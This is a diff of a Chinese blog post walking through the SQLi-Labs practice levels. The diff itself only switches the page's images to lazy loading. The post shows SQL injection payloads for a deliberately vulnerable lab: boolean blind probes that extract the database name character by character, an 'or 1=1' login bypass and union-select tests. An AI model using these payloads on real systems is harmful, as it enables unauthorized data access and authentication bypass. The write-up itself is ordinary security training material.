@@ -43,7 +43,7 @@ var CONFIG = {
   fancybox: false,
   zoomImage: {"gapAside":"20px"},
   galleryWaterfall: undefined,
-  lazyload: false,
+  lazyload: true,
   pjax: {"avoidBanner":true},
   externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
   shortcuts: undefined,
@@ -84,27 +84,45 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
           <a href="#题解" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解" class="headerlink" title="题解"></a>题解</h2>
       <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1</span><br><span class="line">url + ?id=2</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/b8375c2f112d49afbe302feb266d4c4a.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/b8375c2f112d49afbe302feb266d4c4a.png"  alt="在这里插入图片描述">
+      </p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=-1</span><br><span class="line">url + ?id=10086</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/055ce18247ba4ce9bfea1b84f1fad35f.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/055ce18247ba4ce9bfea1b84f1fad35f.png"  alt="在这里插入图片描述">
+      </p>
 <p>通过上面几个测试，发现页面不回显数据库信息，但对错误和正确有显示。</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27;</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/edbb2c2d4b11416f83c51c68b934bb1a.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/edbb2c2d4b11416f83c51c68b934bb1a.png"  alt="在这里插入图片描述">
+      </p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27; --+</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/3e2fc82d861c4b7f8651e716336851b7.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/3e2fc82d861c4b7f8651e716336851b7.png"  alt="在这里插入图片描述">
+      </p>
 <p>再通过以上测试可知是字符型注入。</p>
 <p>由于只对结果真伪进行回显，使用布尔盲注。</p>
 <p>判断当前数据库长度，需要一个一个尝试，这里判断出数据库名长度为 8（页面有回显说明结果为真）。</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1 &#x27;and length((select database()))=8 --+</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/4d9ea94092f241b9b9ee527f6ddb6a96.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/4d9ea94092f241b9b9ee527f6ddb6a96.png"  alt="在这里插入图片描述">
+      </p>
 <p>通过一个一个字符串截取并通过 ASCII 码比较来得出数据库名。</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27; and ascii(substr((select database()), 1, 1))=115 --+</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/c4629927de704dd3886248f5bf0e539c.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/c4629927de704dd3886248f5bf0e539c.png"  alt="在这里插入图片描述">
+      </p>
 <p>ASCII 码 115 对应字母为 s。 </p>
 <p>同理，以下判断都有回显：</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27; and ascii(substr((select database()), 2, 1))=101 --+</span><br><span class="line">url + ?id=1&#x27; and ascii(substr((select database()), 3, 1))=99 --+</span><br><span class="line">url + ?id=1&#x27; and ascii(substr((select database()), 4, 1))=117 --+</span><br><span class="line">url + ?id=1&#x27; and ascii(substr((select database()), 5, 1))=114 --+</span><br><span class="line">url + ?id=1&#x27; and ascii(substr((select database()), 6, 1))=105 --+</span><br><span class="line">url + ?id=1&#x27; and ascii(substr((select database()), 7, 1))=116 --+</span><br><span class="line">url + ?id=1&#x27; and ascii(substr((select database()), 8, 1))=121 --+</span><br></pre></td></tr></table></div></figure>
@@ -192,8 +210,14 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
         <h2 id="题解-2"   >
           <a href="#题解-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2>
       <p>这题较上题有一点区别。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/df120e40c0644224ad5416ee7c31efeb.png" alt="在这里插入图片描述"></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/1e0f16ed2821459e9974c7c4a8c7338a.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/df120e40c0644224ad5416ee7c31efeb.png"  alt="在这里插入图片描述">
+      </p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/1e0f16ed2821459e9974c7c4a8c7338a.png"  alt="在这里插入图片描述">
+      </p>
 <p>这一题只会显示报错，但没有报错信息。那就逐个判断一下。</p>
 <p>传递 <code>id=1&#39;</code> 时，显示错误；当传递 <code>id=1&quot;</code> 时，显示正常，所以可以断定参数 id 为单引号字符串，因为单引号破坏了他原有语法结构。</p>
 <p>然后传递 <code>id=1&#39; --+</code> 时报错，传递 <code>id=1&#39;) --+</code> 发现依然报错。</p>
@@ -277,19 +301,28 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
       <p>第十一关页面发生了变化，是账户登录页面。那么注入点在输入框。</p>
 <p>当输入 username 为 1 时出现错误图片。</p>
 <p>输入 <code>1&#39;</code> ，出现报错信息。根据报错信息可以推断该 sql 语句为：<code>username=&#39;参数&#39; and password=&#39;参数&#39;</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/1e2e04d29c5547ea8aaeed966bcd4e74.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/1e2e04d29c5547ea8aaeed966bcd4e74.png"  alt="在这里插入图片描述">
+      </p>
 <p>知道 sql 语句后可以构造一个恒成立的 sql 语句，看看查询出什么。</p>
 <p>Username 输入（一个万能登录语句）：</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/9109df8fb4664456bc92d92083a7cc3f.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/9109df8fb4664456bc92d92083a7cc3f.png"  alt="在这里插入图片描述">
+      </p>
 <blockquote>
 <p>这里使用 “ # ” 来注释。</p>
 </blockquote>
 <p>再看看联合查询：</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1, 2 #</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/c933e86155bc4e1f9ba7a53fb0438352.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/c933e86155bc4e1f9ba7a53fb0438352.png"  alt="在这里插入图片描述">
+      </p>
 <p>都做到这里了，接下来的思路就和 Less-1 一样了。不多说了。</p>
 
         <h2 id="总结-2"   >
@@ -304,7 +337,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
         <h2 id="题解-7"   >
           <a href="#题解-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-7" class="headerlink" title="题解"></a>题解</h2>
       <p>输入 <code>1&quot;</code> 时，根据报错信息可以判断出参数是双引号带括号的。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/cf80eca6f28246698a8860a68ce3e029.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/cf80eca6f28246698a8860a68ce3e029.png"  alt="在这里插入图片描述">
+      </p>
 <p>判断是否存在 sql 注入。</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) or 1=1 #</span><br></pre></td></tr></table></div></figure>
 
@@ -320,7 +356,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
         <h2 id="题解-8"   >
           <a href="#题解-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-8" class="headerlink" title="题解"></a>题解</h2>
       <p>根据报错信息可以判断出参数是单引号带括号的。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/79c53c876ed9408d80868f7ffb508dc6.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/79c53c876ed9408d80868f7ffb508dc6.png"  alt="在这里插入图片描述">
+      </p>
 <p>剩下的不多说了。</p>
 
         <h1 id="Less-14"   >
@@ -330,7 +369,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
         <h2 id="题解-9"   >
           <a href="#题解-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-9" class="headerlink" title="题解"></a>题解</h2>
       <p>为双引号字符串。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/9f19c7d36ab84c5a8d355fd92a505ff3.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/9f19c7d36ab84c5a8d355fd92a505ff3.png"  alt="在这里插入图片描述">
+      </p>
 <p>这几题都和 Less-11 一样。</p>
 
         <h1 id="Less-15"   >
@@ -339,13 +381,22 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
         <h2 id="题解-10"   >
           <a href="#题解-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-10" class="headerlink" title="题解"></a>题解</h2>
       <p>输入 <code>1&#39;</code> 或者 <code>1</code> 时，错误回显。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/4d33151e36c24124aa7956dea4c618cb.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/4d33151e36c24124aa7956dea4c618cb.png"  alt="在这里插入图片描述">
+      </p>
 <p>输入 <code>1&#39; or 1=1 #</code> 时，正确回显。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/8947b097544e438c8175c2c1ceb448c1.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/8947b097544e438c8175c2c1ceb448c1.png"  alt="在这里插入图片描述">
+      </p>
 <p>判断一下当前数据库名称的长度。</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or length((select database()))&gt;=8 #</span><br></pre></td></tr></table></div></figure>
 
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/e242111e2b9442768c2a5ba1177715c9.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/e242111e2b9442768c2a5ba1177715c9.png"  alt="在这里插入图片描述">
+      </p>
 <p>得到数据库长度为 8。</p>
 <p>然后通过一个一个字符串截取并通过 ASCII 码比较来得出数据库名。</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or ascii(substr((select database()), 1, 1))=115 #</span><br><span class="line">1&#x27; or ascii(substr((select database()), 2, 1))=101 #</span><br><span class="line">...</span><br><span class="line">1&#x27; or ascii(substr((select database()), 8, 1))=121 #</span><br></pre></td></tr></table></div></figure>
@@ -358,7 +409,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
         <h2 id="题解-11"   >
           <a href="#题解-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-11" class="headerlink" title="题解"></a>题解</h2>
       <p>Username 输入<code>1&quot;) or 1=1 #</code> 时，提示正确。所以参数为双引号加括号。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/c179f2c353e942248aae0b90932e1ea0.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/02/c179f2c353e942248aae0b90932e1ea0.png"  alt="在这里插入图片描述">
+      </p>
 <p>接下来的步骤就和 Less-5 与 Less-15 一样了。布尔盲注。</p>
 <hr>
 <p><font color="#EE0000">
@@ -396,7 +450,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
           Less-15</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-10"><span class="toc-text">
           题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-16"><span class="toc-text">
           Less-16</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-11"><span class="toc-text">
-          题解</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">53</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">21</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+          题解</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">53</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">21</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazyload@2.0.0-rc.2/lazyload.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
   var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
   // 加载进度条的计时器
   var loadingTimer = null;
